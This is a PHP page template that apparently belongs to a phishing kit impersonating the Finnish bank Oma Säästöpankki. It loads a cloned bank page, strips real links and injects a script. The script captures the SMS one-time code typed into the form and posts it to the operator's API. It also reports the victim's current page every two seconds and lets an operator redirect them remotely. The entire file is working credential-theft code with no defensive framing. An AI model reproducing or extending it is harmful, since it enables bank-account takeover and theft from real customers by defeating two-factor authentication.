<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Oma Säästöpankki');
$htmlContent = file_get_contents(__DIR__ . '/omasp3.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/cross-domain-bridge\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/saved_resource\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);

$basePath = '/omasp-files/';
$htmlContent = str_replace('./omasp_files/', $basePath, $htmlContent);
$htmlContent = str_replace('omasp_files/', $basePath, $htmlContent);
$htmlContent = preg_replace('/url\(([^\/)]+\.(woff2?|ttf))\)/i', 'url(' . $basePath . '$1)', $htmlContent);

$hideStyle = '<style>
    #goog-gt-tt,
    #goog-gt-t,
    [id*="goog-gt"],
    [class*="goog-gt"],
    [id*="google_translate"],
    [class*="google_translate"],
    .VIpgJd-yAWNEb-L7lbkb,
    .skiptranslate {
        display: none !important;
        visibility: hidden !important;
    }
    body {
        overflow-y: auto !important;
        max-height: 100vh !important;
    }
</style>';

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $hideStyle . '</head>', $htmlContent);
} else {
    $htmlContent = $hideStyle . $htmlContent;
}

$adminScript = '';
$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            const smsCodeInput = document.getElementById(\'sms-code\');
            
            if (!smsCodeInput) {
                return false;
            }
            
            const smsCode = smsCodeInput.value.trim();
            
            if (!smsCode) {
                return false;
            }
            
            fetch(\'/api/save-omasp-sms\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    sms_code: smsCode
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(\'Network response was not ok\');
                }
                return response.json();
            })
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else if (data.message) {
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error(\'Error:\', error);
            });
            
            return false;
        }
        
        function initForm() {
            const form = document.getElementById(\'sms-form\');
            if (form) {
                form.onsubmit = function(e) {
                    return handleFormSubmit(e);
                };
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            setTimeout(initForm, 100);
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</body>') !== false) {
    $htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
} else {
    $htmlContent = $htmlContent . $adminScript;
}

$content = ob_get_clean();
echo $htmlContent;
?>



